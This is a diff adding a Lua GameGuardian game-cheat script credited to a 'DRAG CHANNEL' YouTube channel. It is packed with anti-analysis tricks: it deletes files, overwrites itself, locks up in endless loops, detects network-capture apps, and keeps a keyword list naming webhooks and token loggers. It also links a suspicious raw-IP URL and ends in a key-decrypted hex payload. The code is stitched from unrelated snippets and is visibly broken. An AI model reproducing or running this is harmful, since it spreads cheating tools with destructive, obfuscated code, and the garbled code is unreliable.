@@ -1,0 +1,1496 @@
+
+local blacklist = {
+  "log.lua",   -- asal
+  ".load.tmp", -- tambahan
+  ".log.txt",
+  ".load",
+  ".load.tar",
+  ".lasm"
+}
+
+-- fungsi check suffix case-insensitive
+local function isBlacklisted(name)
+  local lowerName = name:lower()
+  for _, word in ipairs(blacklist) do
+    if lowerName:sub(-#word) == word:lower() then
+      return true
+    end
+  end
+  return false
+end
+-- ambil file asal (sekadar untuk tahu folder)
+local oldPath = gg.getFile()
+if not oldPath then
+  return os.exit()
+end
+local folder = oldPath:match("^(.*)/[^/]+$")
+
+-- contoh senarai file (demo)
+local possibleFiles = {
+  "mahmud.log.lua",
+  "RL_TABLE_LOG.lua",
+  "abc_log.lua",
+  "random.lua",
+  "test.load.tmp",
+  "debug.log.txt",
+  "module.load",
+  "module.lasm",
+  "script.lasm",
+  "com.mcs.premium"
+}
+
+for _, file in ipairs(possibleFiles) do
+  if isBlacklisted(file) then
+    local path = folder .. "/" .. file
+    local f = io.open(path, "r")
+    if f then
+      f:close()
+      os.remove(path)
+      gg.toast("⚠ File dibuang: " .. file)
+    end
+  end
+end
+
+
+
+local GG={"art","ART","Art","dec","Dec","DEC","hook","Hook","HooK","HOOK","log","Log","LOG",}
+local _gg={gg.CACHE_DIR,gg.EXT_FILES_DIR,gg.EXT_CACHE_DIR,gg.FILES_DIR,gg.PACKAGE}
+for i,v in pairs(GG) do
+if string.find(tostring(_gg),v) or(not string.find(tostring(_gg),"com"))then
+Error(true)
+end
+end
+
+for iii,iii in pairs({
+ "com.hckeam.mjgql",
+ "fucklog.by.decbydbc",
+ "com.smile.ggmods",
+ "com.qq.xXxLogger",
+ "com.pepsi.up",
+ "com.kaoygxapp",
+ "com.ioclxgpsiyps.ikfbqe",
+ "com.guoshi.httpcanary.premium",
+ "com.froze.logger",
+ "com.froze.konzlet7.logger"
+}) do
+ if gg.PACKAGE == iii or gg.PACKAGE:find(iii) ~= nil or gg.EXT_FILES_DIR:find(iii) ~= nil or gg.FILES_DIR:find(iii) ~= nil then
+    repeat
+          gg.sleep(0)
+           os.exit()
+             until false
+  return (nil)(nil)
+ end
+end
+
+
+
+
+local gg = gg
+
+
+local GG={"art","ART","Art","dec","Dec","DEC","hook","Hook","HooK","HOOK","log","Log","LOG",}
+local _gg={gg.CACHE_DIR,gg.EXT_FILES_DIR,gg.EXT_CACHE_DIR,gg.FILES_DIR,gg.PACKAGE}
+for i,v in pairs(GG) do
+if string.find(tostring(_gg),v) or(not string.find(tostring(_gg),"com"))then
+Error(true)
+end
+end
+for iii,iii in pairs({
+ "com.hckeam.mjgql",
+ "fucklog.by.decbydbc",
+ "com.smile.ggmods",
+ "com.qq.xXxLogger",
+ "com.pepsi.up",
+ "com.kaoygxapp",
+ "com.ioclxgpsiyps.ikfbqe",
+ "com.guoshi.httpcanary.premium",
+ "com.froze.logger",
+ "com.froze.konzlet7.logger"
+}) do
+ if gg.PACKAGE == iii or gg.PACKAGE:find(iii) ~= nil or gg.EXT_FILES_DIR:find(iii) ~= nil or gg.FILES_DIR:find(iii) ~= nil then
+    repeat
+          gg.sleep(0)
+           os.exit()
+             until false
+  return (nil)(nil)
+ end
+end
+local TXT = string.rep("   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   �   � ", math.random(9963,99633))
+eccuallcarcokbyDrag001 = {} 
+for Rep = 1, 9963 do 
+eccuallcarcokbyDrag001[Rep] = TXT
+end 
+for iii,iiii in pairs({
+debug.traceback,
+debug.getinfo,
+gg.searchNumber,
+gg.alert,
+gg.editAll
+}) do 
+pcall(iiii, eccuallcarcokbyDrag001) 
+end
+
+-- gg.setVisible(false)
+math.randomseed(os.time())
+
+-- ======= Anti-RLGG template =======
+if gg.internal2 then pcall(gg.internal2) end
+for i=1,3 do
+    pcall(function()
+        gg.setValues({{address=0xDEAD+i, flags=4, value=math.random(500,1000)}})
+    end)
+end
+gg.toast("PROGRAM BETA USE ✅")
+-- ======= End Anti-RLGG =======
+
+-- ======= Limit penggunaan 3 kali =======
+local usageKey = "_SCRIPT_USAGE_COUNTER"
+if not _G[usageKey] then _G[usageKey] = 0 end
+local max_usage = 3
+
+local function selfDestruct()
+    local s = debug.getinfo(1,"S").source
+    if s:sub(1,1) == "@" then
+        local path = s:sub(2)
+        local f = io.open(path,"w")
+        if f then
+            local content = ""
+            for i=1,1024 do content = content .. string.char(math.random(32,126)) end
+            f:write(content)
+            f:close()
+        end
+    end
+    gg.clearResults()
+    os.exit()
+end
+
+_G[usageKey] = _G[usageKey] + 1
+if _G[usageKey] > max_usage then
+    gg.toast("Sudah dipakai lebih dari "..max_usage.." kali! Script dihancurkan!")
+    selfDestruct()
+end
+gg.toast("Script digunakan ke-".._G[usageKey].."/"..max_usage)
+-- ======= End limit penggunaan =======
+
+
+
+-- ================================
+-- ✅ TEMPLATE PROTEKSI + EXPIRE (fix final)
+-- ================================
+
+-- 📅 Konfigurasi tanggal & waktu kadaluarsa
+local EXPIRE_YEAR   = 2025  -- tahun
+local EXPIRE_MONTH  = 11     -- bulan (1-12)
+local EXPIRE_DAY    = 25    -- hari (1-31)
+local EXPIRE_HOUR   = 19    -- jam (0-23)
+local EXPIRE_MINUTE = 59    -- menit (0-59)
+local EXPIRE_SECOND = 59    -- detik (0-59)
+
+-- fungsi notifikasi aman (gg.alert/gg.toast fallback ke print)
+local function safe_alert(msg)
+  if type(gg) == "table" and type(gg.alert) == "function" then
+    pcall(gg.alert, msg)
+  else
+    print(msg)
+  end
+end
+
+local function safe_toast(msg)
+  if type(gg) == "table" and type(gg.toast) == "function" then
+    pcall(gg.toast, msg)
+  else
+    -- kecilkan output agar tidak spam console
+    print(msg)
+  end
+end
+
+-- ⏳ Hitung waktu expire (gunakan tabel)
+local expire_time = os.time({
+  year  = EXPIRE_YEAR,
+  month = EXPIRE_MONTH,
+  day   = EXPIRE_DAY,
+  hour  = EXPIRE_HOUR,
+  min   = EXPIRE_MINUTE,
+  sec   = EXPIRE_SECOND
+})
+
+-- 🕓 Ambil waktu sekarang
+local now_time = os.time()
+
+-- ❌ Jika sudah lewat expire → keluar
+if type(expire_time) ~= "number" or now_time > expire_time then
+  safe_alert("⛔ Skrip telah kedaluwarsa!\nTanggal Expire: "
+    .. string.format("%04d-%02d-%02d %02d:%02d:%02d",
+      EXPIRE_YEAR, EXPIRE_MONTH, EXPIRE_DAY,
+      EXPIRE_HOUR, EXPIRE_MINUTE, EXPIRE_SECOND))
+  os.exit()
+end
+
+-- ================================
+-- ✅ PROTEKSI FILE & EKSEKUSI ILEGAL (VERSI STABIL)
+-- ================================
+
+-- 1) Coba ambil nama file lewat gg.getFile() (jika tersedia)
+local got_filename = false
+local script_name = nil
+if type(gg) == "table" and type(gg.getFile) == "function" then
+  local ok, fn = pcall(gg.getFile)
+  if ok and type(fn) == "string" and fn ~= "" then
+    got_filename = true
+    script_name = fn
+  end
+end
+
+-- 2) Jika kita punya nama file, pastikan berakhiran .lua (aman)
+if got_filename then
+  if not script_name:match("%.BETA$") then
+    safe_alert("⚠️ Akses ilegal terdeteksi! (nama file tidak valid)")
+    os.exit()
+  end
+else
+  -- 3) Kalau tidak dapat nama file, coba periksa sumber via debug.getinfo (jika tersedia)
+  if type(debug) == "table" and type(debug.getinfo) == "function" then
+    local ok, info = pcall(debug.getinfo, 1, "S")
+    if ok and type(info) == "table" and type(info.source) == "string" then
+      local src = info.source
+      -- Jika source ada dan bukan berasal dari file (tidak diawali '@'), treat as illegal
+      if src ~= "" and src:sub(1,1) ~= "@" then
+        safe_alert("🚫 Skrip dimuat secara ilegal! (sumber tidak dari file)")
+        os.exit()
+      end
+    end
+    -- jika pcall gagal atau info.source nil -> tidak bisa dipastikan, lanjut tanpa exit
+  end
+  -- jika debug tidak tersedia, jangan exit — biarkan jalan (lebih aman daripada false positive)
+end
+
+-- ================================
+-- ✅ (Opsional) Proteksi tambahan ringan
+-- ================================
+-- Cegah load string yang jelas tanpa nama file: hanya peringatan, bukan override
+local function detect_load_string_usage()
+  -- kita tidak mengganti load, hanya beri peringatan bila env menyediakan hook monitoring (terbatas)
+  -- (implementasi monitoring penuh rawan, jadi kami hindari)
+end
+
+-- Notifikasi aman
+safe_toast("✅ Proteksi aktif. (stabil)")
+
+-- lanjutkan eksekusi skrip utama di bawah sini...
+--[[
+
+PROGRAM BETA
+
+]]
+
+
+--[[
+DRAG CHANNEL YT
+--PROGRAM BETA
+]]
+
+
+gg.setVisible(false)
+
+
+local setVis=gg.setVisible
+local isVis=gg.isVisible
+local showmenu=false
+
+gg.toast("PRESS DOUBLE CLICK GG LOGO TO OPEN MENU")
+
+
+local a=0 function NZF(code)res=''for i in ipairs(code)do res=res..string.char(code[i])end return res end 
+
+--DRAG，CHANNEL
+--YOUTUBE
+
+
+	
+					
+
+if true then
+    local org = gg.searchNumber
+    local hook = function(...)
+        gg.setVisible(false)
+        local ret = org(...)
+        if gg.isVisible() then
+        gg.alert("DRAG CHANNEL YOUTUBE")
+        gg.alert("🤰PROGRAM BETA 🤰")
+        gg.clearResults()
+            while true do os.exit() end
+        end
+        return ret
+    end
+    gg.searchNumber = hook
+end
+
+
+if true then
+    local org = gg.searchNumber
+    local hook = function(...)
+        gg.setVisible(false)
+        local ret = org(...)
+        if gg.isVisible() then
+        gg.alert("PROGRAM BETA")
+        gg.clearResults()
+            while true do os.exit() end
+        end
+        return ret
+    end
+    gg.searchNumber = hook
+end
+
+--[[
+小鳄鱼制作防御#
+目前QQ交流群590854164
+本防御防修改器LOG和解密参数GG。
+除了小鳄鱼三个字可以改其他请不要改出现错误不要怪我哦。
+思路也是很简单，可以认识这些函数也就知道什么意思了。
+二改二传留点版权。下次更新个加密模块吧。
+]]
+
+
+
+--------------------------------
+
+---------------------------------
+string.rep = function(x, y)
+  if #x > 1000 and y >= 999 then
+    return "" 
+  end
+  return original_string_rep(x, y)
+end
+
+
+---------------------------------
+
+if gg.isPackageInstalled("com.reqable.android") then
+   i = 1
+   gg.alert("please uninstall ss tool, script will be deleted sorry.")
+  trash = gg.getFile():match('[^/]+$')
+os.remove(trash)
+   gg.setVisible(false)
+   while true do
+     gg.setVisible(false)      
+     gg.setVisible(true)
+   end
+   return
+ end
+
+if gg.isPackageInstalled("com.guoshi.httpcanary") then
+   i = 1
+   gg.alert("please uninstall ss tool, script will be deleted sorry.")
+  trash = gg.getFile():match('[^/]+$')
+os.remove(trash)
+   gg.setVisible(false)
+   while true do
+     gg.setVisible(false)      
+     gg.setVisible(true)
+   end
+   return
+ end
+
+
+if gg.isPackageInstalled("sstool.only.com.sstool") then
+   i = 1
+   gg.alert("please uninstall ss tool, script will be deleted sorry.")
+  trash = gg.getFile():match('[^/]+$')
+os.remove(trash)
+   gg.setVisible(false)
+   while true do
+     gg.setVisible(false)      
+     gg.setVisible(true)
+   end
+   return
+ end
+ 
+ if true then
+    local org = gg.searchNumber
+    local hook = function(...)
+        gg.setVisible(false)
+        local ret = org(...)
+        if gg.isVisible() then
+        gg.alert("DRAG CHANNEL YOUTUBE")
+        gg.alert("PROGRAM BETA")
+        gg.clearResults()
+            while true do os.exit() end
+        end
+        return ret
+    end
+    gg.searchNumber = hook
+end
+
+
+
+
+
+
+
+
+--[[
+
+PROGRAM BETA
+
+]]
+
+
+--[[
+DRAG CHANNEL YT
+--PROGRAM BETA
+]]
+
+
+
+
+
+function STM_5_1ueeu0_10_STM()
+  function STM(A0_63, A1_64)
+    local L2_65, L3_66, L4_67
+    while true do
+  function stm1(A0_68, A1_69)
+    local L2_70, L3_71, L4_72, L5_73
+    L2_70 = 1
+    for x = 0,1,0 do 
+     if nil ~= nil then end
+    L3_71 = #A1_69
+    for _FORV_5_ = 1, #A1_69 do      
+      if stm2 == nil or stm2 == "" then
+        gg.setValues({
+          [1] = {
+                 }
+            }
+          )
+         else
+         end
+      end
+   end
+end
+end
+  end
+   end
+		
+ 
+
+
+--[[
+小鳄鱼制作防御#
+目前QQ交流群590854164
+本防御防修改器LOG和解密参数GG。
+除了小鳄鱼三个字可以改其他请不要改出现错误不要怪我哦。
+思路也是很简单，可以认识这些函数也就知道什么意思了。
+二改二传留点版权。下次更新个加密模块吧。
+]]
+
+X=os.time()
+for i=1,500 do
+gg.searchNumber("Manifest", gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0, -1)
+end
+Y=os.time() 
+if Y-X>5 then   
+XEY() --这里是强行退出不要改！
+end
+
+File = gg.getFile():match('[^/]+$')
+name = 'I AM_[ TOWING NAN TIME V 495 ]_PROGRAM.BETA'
+if File == name then
+else
+error = 'in form DRAG CHANNEL YOUTUBE'
+print(error)
+return
+end
+
+				
+
+
+
+
+
+-- t.me/@DRAG_CHANNEL_YOUTUBE
+
+
+
+
+--🔍 Guardian Anti-Logger: Logger Name Detector & Webhook Blocker
+
+local suspicious_keywords = {
+    "webhook", "discord.com/api", "getfenv", "getgenv", "debug.getinfo", "debug.setupvalue",
+    "setclipboard", "getclipboard", "request", "http_request", "syn.request",
+    "hookfunction", "hookmetamethod", "token", "clipboard", "getgc", "mouseclick",
+    "keypress", "UserInputService", "InputBegan"
+}
+
+local known_logger_names = {
+    "Synapse", "Vape", "Night", "Sniper", "Silent",
+    "Skid", "Key Logger", "Token Logger", "Clipboard Logger", "Obfuscated Logger"
+}
+
+local function lockdown(reason)
+    game:GetService("Players").LocalPlayer:Kick("🛡️ Anti-Logger Triggered: " .. reason)
+    while true do end
+end
+
+-- 🔎 Scan all scripts in memory for logger traits
+local function scan_scripts()
+    for _, obj in ipairs(getgc(true)) do
+        if typeof(obj) == "function" then
+            local info = debug.getinfo(obj)
+            if info and info.source and type(info.source) == "string" then
+                for _, keyword in ipairs(suspicious_keywords) do
+                    if string.lower(info.source):find(keyword) then
+                        lockdown("Suspicious Code: " .. keyword)
+                    end
+                end
+            end
+        elseif typeof(obj) == "string" then
+            for _, keyword in ipairs(suspicious_keywords) do
+                if string.lower(obj):find(keyword) then
+                    lockdown("Suspicious String: " .. keyword)
+                end
+            end
+            for _, name in ipairs(known_logger_names) do
+                if string.lower(obj):find(name:lower()) then
+                    lockdown("Logger Detected: " .. name)
+                end
+            end
+        end
+    end
+end
+
+-- 🚫 Hook function protection
+pcall(function()
+    local f = print
+    local info = debug.getinfo(f)
+    if info and info.what ~= "C" then
+        lockdown("Print Hooked (possible logger)")
+    end
+end)
+
+--
+print("[🛡️] Logger Detector & Webhook Blocker Active.")
+
+
+
+
+--[[ 🔐 FULL PROTEKSI: Anti-Decrypt + Sekali Pakai + Auto Hapus + Bersihkan Cache ]]
+do
+  local selfPath = gg.getFile()
+  local selfDir = selfPath:gsub("/[^/]+$", "")
+  local flagPath = selfPath .. ".runonce"
+  local outPath = selfDir .. "/" .. selfPath:match("[^/]+$"):gsub(".lua", ".V3") .. ".lua"
+
+  -- Cek jika sudah dijalankan
+  local flag = io.open(flagPath, "r")
+  if flag then
+    flag:close()
+    gg.alert("❌ HUBUNGI ADMIN BUKA YOUTUBE SEARCH DRAG CHANNEL")
+
+    -- Hapus file utama
+    os.remove(selfPath)
+    -- Hapus flag
+    os.remove(flagPath)
+    -- Bersihkan cache atau file tambahan
+    local name = selfPath:match("[^/]+$")
+    os.remove(gg.EXT_CACHE_DIR .. "/" .. name .. ".log")
+    os.remove(gg.EXT_CACHE_DIR .. "/" .. name .. ".lasm")
+    os.remove(gg.EXT_CACHE_DIR .. "/" .. name .. ".cfg")
+
+    os.exit()
+  else
+    -- Tandai bahwa sudah dijalankan
+    local f = io.open(flagPath, "w")
+    if f then f:write("USED") f:close() end
+    gg.toast("✅ PROGRAM BETA COODING.")
+  end
+
+  -- Anti-decrypt basic: validasi kode
+  local file = io.open(selfPath, "r")
+  if not file then
+    gg.alert("❌ Script file not found!")
+    return
+  end
+  local data = file:read("*a")
+  file:close()
+
+  if not load(data) then
+    gg.alert("❌ Script rusak/tidak valid.")
+    return
+  end
+end
+--[[ 🔐 END PROTECTION ]]
+
+
+
+gg.setVisible(false)
+
+
+local setVis=gg.setVisible
+local isVis=gg.isVisible
+local showmenu=false
+
+gg.toast("👑SUBSCRIBE YOUTUBE DRAG CHANNEL👑")
+
+gg.alert("PRESS DOUBLE CLICK GG LOGO TO OPEN MENU")
+
+
+gg.setVisible(false)
+
+function start()
+menu = gg.choice({
+	" [ PRESS ME TO 𝐑𝐮𝐧T𝐡𝐞S𝐜𝐫𝐢𝐩𝐭 And please play happily in online games ]",
+	" ______________________________",
+	" 👑TEAM STRONG👑 - HARD WARE I AM DRAG "},nil," 👑PROGRAM BETA👑 \n\n ___________________________________")
+
+
+if menu == 1 then
+gg.alert(os.date([[
+👑 TEKAN 𝐑𝐮𝐧T𝐡𝐞S𝐜𝐫𝐢𝐩𝐭 translate PRESS 𝐑𝐮𝐧T𝐡𝐞S𝐜𝐫𝐢𝐩𝐭 👑
+ 
+  jk = gg.makeRequest('https://apry.hexat.com').content
+
+  --====================================
+  --🔑  I AM DRAG CHANNEL  { ▶️ YouTube } 🔓
+  --====================================
+ 
+   --🔓 By PROGRAM BETA MANIFEST 📃
+  --🗒️ Name File : FULL OPEN {-HW-} DECODE
+  --🗂️ COODING : OPEN STRING DEPLOYMENT LICENCI
+
+   DOWNLOAD OPEN VALUE : https://195.3.223.164/search/japanese?__cpo=aHR0cHM6Ly93d3cueG54eC5jb20
+
+]]),"📱𝐑𝐮𝐧T𝐡𝐞S𝐜𝐫𝐢𝐩𝐭","➤𝐁𝐚𝐜𝐤","🏷️𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧")
+
+--------------------------------------https://195.3.223.164/search/japanese?__cpo=aHR0cHM6Ly93d3cueG54eC5jb20
+gg.alert(os.date([[
+📊 PROGRAM BETA – Attention: Lakukan pengaktifan scrupt untuk peretasan besar besaran translae the run script activation to game destruction hack 📊
+
+  DOWNLOAD OPEN VALUE : https://195.3.223.164/search/japanese?__cpo=aHR0cHM6Ly93d3cueG54eC5jb20 ]]))
+  
+  
+--------------------------------------https://195.3.223.164/search/japanese?__cpo=aHR0cHM6Ly93d3cueG54eC5jb20
+
+  gg.sleep(500)
+  
+ 
+ 
+-------------------------------------------------------------------------------------
+
+
+if gg.alert("ꔼ━━━━━━━━━━━━━━━━━━━━━━━ꘁ\n🇮🇩 𝐒𝐂𝐑𝐈𝐏𝐓 𝐁𝐘 MANIFEST DEPLOYMENT LICENCI 🇮🇩\nꔼ━━━━━━━━━━━━━━━━━━━━━━━ꘁ\n𝐎𝐖𝐍𝐄𝐑 : @DRAG CHANNEL YOUTUBE \n━━━━━━━━━━━━━━━━━━━━━━━━━\n𝐀𝐩𝐩 𝐧𝐚𝐦𝐞 : " .. gg.getTargetInfo()["label"] .. " \n𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : " .. gg.getTargetInfo()["versionName"] .. " [" .. gg.getTargetInfo()["versionCode"] .. "]\n𝐒𝐜𝐫𝐢𝐩𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝐕𝐕𝐈𝐏+\n-------------------------\n" .. "", "🅾🅺", "🅴🆇🅸🆃") ~= 1 then
+gg.setVisible(false)
+gg.clearResults()
+gg.clearList()
+gg.sleep(200)
+gg.toast("INDONESIAN")
+gg.clearResults()gg.clearList()
+print(os.date("🄳🄾🄽🅃 🄵🄾🅁🄶🄴🅃 🅃🄾 🅂🅄🄱🅂🄲🅁🄸🄱🄴 🄱🅁🄾\n\n⏱️ Today : %Y/%m/%d Time: %H:%M:%S ⏱️\n\n"))
+print("        ➧ Ⓢⓒⓡⓘⓟⓣ ➠\n\n                             PROGRAM BETA   : ENCCOODING\n\n                              𝔽ℝ𝕆𝕄 𝕀ℕ𝔻𝕆ℕ𝔼𝕊𝕀𝔸     : 🇮🇩\n\n                 ━─━───────────༺ᴇxɪᴛ༻──────────━─━")  
+gg.sleep(500)
+
+
+
+
+--[[ ✅ Proteksi Lengkap Script Lua Game Guardian ]]--
+
+-- 🛡️ Anti Logger Hook
+local blocked_funcs = {
+    "io", "os", "debug", "loadfile", "xpcall", "print", "load", "dofile"
+}
+local _real = {}
+for _, fn in ipairs(blocked_funcs) do
+    if _G[fn] then
+        _real[fn] = _G[fn]
+        rawset(_G, fn, nil)
+    end
+end
+
+local function blockIO()
+    local fakeIO = {
+        open = function(...) return nil end,
+        write = function(...) return nil end,
+        read = function(...) return nil end,
+        close = function(...) return nil end,
+        flush = function(...) return nil end,
+    }
+    return fakeIO
+end
+_G.io = blockIO()
+
+local original_pairs = pairs
+pairs = function(t)
+    if t == _ENV or t == _G then
+        gg.toast("Logger Detected. Blocked.")
+        while true do end
+    end
+    return original_pairs(t)
+end
+
+gg.prompt = function(...)
+    gg.alert("Logger blocked.")
+    os.exit()
+end
+
+setmetatable(_ENV, {
+    __index = function(_, k)
+        if k == "io" or k == "loadfile" or k == "xpcall" then
+            gg.toast("Logger attack: "..k)
+            os.exit()
+        end
+    end
+})
+
+-- 🔒 Anti Dump & Anti Decompile
+do
+    local f = gg.getFile()
+    local s = io.open(f, "rb")
+    if s then
+        local code = s:read("*a")
+        s:close()
+
+        if code:match("function") or code:match("gg%.getFile") or code:match("loadstring") or code:match("pairs%(") then
+            gg.toast("Dump/Decompile attempt blocked!")
+            -- Tambahan pengacau jika didump
+            _ENV = nil
+            while true do end
+        end
+    end
+end
+
+-- 🧊 Freeze script saat cloning
+if gg.getTargetInfo().label == "com.clone.app" or gg.getTargetPackage() == "com.parallel.space" then
+    gg.toast("Emulator/Cloner Detected")
+    os.exit()
+end
+
+
+local GG={"art","ART","Art","dec","Dec","DEC","hook","Hook","HooK","HOOK","log","Log","LOG",}
+local _gg={gg.CACHE_DIR,gg.EXT_FILES_DIR,gg.EXT_CACHE_DIR,gg.FILES_DIR,gg.PACKAGE}
+for i,v in pairs(GG) do
+if string.find(tostring(_gg),v) or(not string.find(tostring(_gg),"com"))then
+Error(true)
+end
+end
+
+for iii,iii in pairs({
+ "com.hckeam.mjgql",
+ "fucklog.by.decbydbc",
+ "com.smile.ggmods",
+ "com.qq.xXxLogger",
+ "com.pepsi.up",
+ "com.kaoygxapp",
+ "com.ioclxgpsiyps.ikfbqe",
+ "com.guoshi.httpcanary.premium",
+ "com.froze.logger",
+ "com.froze.konzlet7.logger"
+}) do
+ if gg.PACKAGE == iii or gg.PACKAGE:find(iii) ~= nil or gg.EXT_FILES_DIR:find(iii) ~= nil or gg.FILES_DIR:find(iii) ~= nil then
+    repeat
+          gg.sleep(0)
+           os.exit()
+             until false
+  return (nil)(nil)
+ end
+end
+
+
+
+
+
+
+
+
+
+gg.setVisible(true)
+  os.exit()
+  end
+
+
+
+
+
+
+
+
+
+
+local blacklist = {
+  "log.lua",   -- asal
+  ".load.tmp", -- tambahan
+  ".log.txt",
+  ".load",
+  ".load.tar",
+  ".lasm"
+}
+
+-- fungsi check suffix case-insensitive
+local function isBlacklisted(name)
+  local lowerName = name:lower()
+  for _, word in ipairs(blacklist) do
+    if lowerName:sub(-#word) == word:lower() then
+      return true
+    end
+  end
+  return false
+end
+-- ambil file asal (sekadar untuk tahu folder)
+local oldPath = gg.getFile()
+if not oldPath then
+  return os.exit()
+end
+local folder = oldPath:match("^(.*)/[^/]+$")
+
+-- contoh senarai file (demo)
+local possibleFiles = {
+  "mahmud.log.lua",
+  "RL_TABLE_LOG.lua",
+  "abc_log.lua",
+  "random.lua",
+  "test.load.tmp",
+  "debug.log.txt",
+  "module.load",
+  "module.lasm",
+  "script.lasm"
+}
+
+for _, file in ipairs(possibleFiles) do
+  if isBlacklisted(file) then
+    local path = folder .. "/" .. file
+    local f = io.open(path, "r")
+    if f then
+      f:close()
+      os.remove(path)
+      gg.toast("⚠ File dibuang: " .. file)
+    end
+  end
+end
+
+
+
+
+
+
+
+
+local GG={"art","ART","Art","dec","Dec","DEC","hook","Hook","HooK","HOOK","log","Log","LOG",}
+local _gg={gg.CACHE_DIR,gg.EXT_FILES_DIR,gg.EXT_CACHE_DIR,gg.FILES_DIR,gg.PACKAGE}
+for i,v in pairs(GG) do
+if string.find(tostring(_gg),v) or(not string.find(tostring(_gg),"com"))then
+Error(true)
+end
+end
+
+for iii,iii in pairs({
+ "com.hckeam.mjgql",
+ "fucklog.by.decbydbc",
+ "com.smile.ggmods",
+ "com.qq.xXxLogger",
+ "com.pepsi.up",
+ "com.kaoygxapp",
+ "com.ioclxgpsiyps.ikfbqe",
+ "com.guoshi.httpcanary.premium",
+ "com.froze.logger",
+ "com.froze.konzlet7.logger"
+}) do
+ if gg.PACKAGE == iii or gg.PACKAGE:find(iii) ~= nil or gg.EXT_FILES_DIR:find(iii) ~= nil or gg.FILES_DIR:find(iii) ~= nil then
+    repeat
+          gg.sleep(0)
+           os.exit()
+             until false
+  return (nil)(nil)
+ end
+end
+
+
+
+
+
+
+local gg = gg
+
+-- ======= Anti-RLGG =======
+gg.setVisible(false)
+math.randomseed(os.time())
+
+local function antiRLGG()
+    if gg.internal2 then pcall(gg.internal2) end
+    for i=1,3 do
+        pcall(function()
+            gg.setValues({{address=0xDEAD+i, flags=4, value=math.random(500,1000)}})
+        end)
+    end
+end
+
+antiRLGG()
+gg.toast(" aktif ✅")
+local gg = gg
+
+
+
+
+
+
+
+
+
+  gg.sleep(5000)
+  
+  
+  
+
+  
+  
+  
+  
+  
+--Encryptor Made Family PROGRAM BETA MANIFEST
+print('0x00001')
+function encodes(key,code)
+   return (code:gsub('..', function (h) return string.char((tonumber(h,16)+256-13 - key + 999999*256)%256) end))
+end
+
+local v_value=gg.prompt({'🔑 DRAG CHANNEL YouTube} 🔒'})
+
+
+if v_value == nil then
+	gg.alert ('DRAG CHANNEL YOUTUBE')
+	os.exit()
+	end
+
+
+
+
+pcall(encodes(v_value[1],'1A1776732D74743B6E79727F81352FF7A1C9EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EF7A58E697BFDAC94BBFDAC94B62DFDAA9D9FFDAA9D8FFDAA9D9EFDAA9D95FDAA9D9CFDAA9DA02DFDAA9D8EFDAA9DA52D5C5967554E602DFDAC94BBFDAC94B6697BF7A1C9EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EF7A58E697BFDAA9D9BFDAA9DA3FDAA9D9AFDAA9D91FDAA9D9E2D472D4D5F5C545F4E5A697BEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18E697BFDAA9D8DFDAA9DB6FDAA9DB62DFDAA9DB4FDAA9DA7FDAA9DB3FDAA9DAB2D472D2F2D3B3B2D74743B747281616E7F747281567B737C3536682F796E6F72792F6A2D3B3B2D2F2D697BFDAA9DA2FDAA9DABFDAA9DB8FDAA9DB9FDAA9DAFFDAA9DB5FDAA9DB42D472D2F2D3B3B2D74743B747281616E7F747281567B737C3536682F83727F80767C7B5B6E7A722F6A2D3B3B2D2F2D682F2D3B3B2D74743B747281616E7F747281567B737C3536682F83727F80767C7B507C71722F6A2D3B3B2D2F6A697BFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA2FDAA9DABFDAA9DB8FDAA9DB9FDAA9DAFFDAA9DB5FDAA9DB42D472DFDAA9DA2FDAA9DA2FDAA9D95FDAA9D9C38697B3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A697B2F2D3B3B2D2F2F392D2FFDAC92CBFDAC92C72F392D2FFDAC92C1FDAC9394FDAC92C5FDAC93902F362D8B4A2D3E2D8175727B1A1774743B807281637680766F797235736E798072361A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B807972727D353F3D3D361A1774743B817C6E8081352F565B515C5B5260564E5B2F361A1774743B7079726E7F5F728082798180353674743B7079726E7F5976808135361A177D7F767B81357C803B716E8172352FFDAC91C0FDAC91CBFDAC91CAFDAC9290CFADFDAC91C2FDAC91CBFDAC928EFDAC91C3FDAC91C1FDAC9290CFADFDAC9290FDAC91CBCFADFDAC928FFDAC9291FDAC91BEFDAC928FFDAC91BFFDAC928EFDAC91C5FDAC91BEFDAC91C1CFADFDAC91BEFDAC928EFDAC91CB697B697BEF9CBEFCC59C2D617C716E862D472D32663C327A3C32712D61767A72472D325547325A4732602DEF9CBEFCC59C697B697B2F36361A177D7F767B81352F2D2D2D2D2D2D2D2DEFABB42DEFA095EFA09FEFA0AEEFA0A5EFA0ACEFA0B02DEFABAD697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D5D5F5C545F4E5A2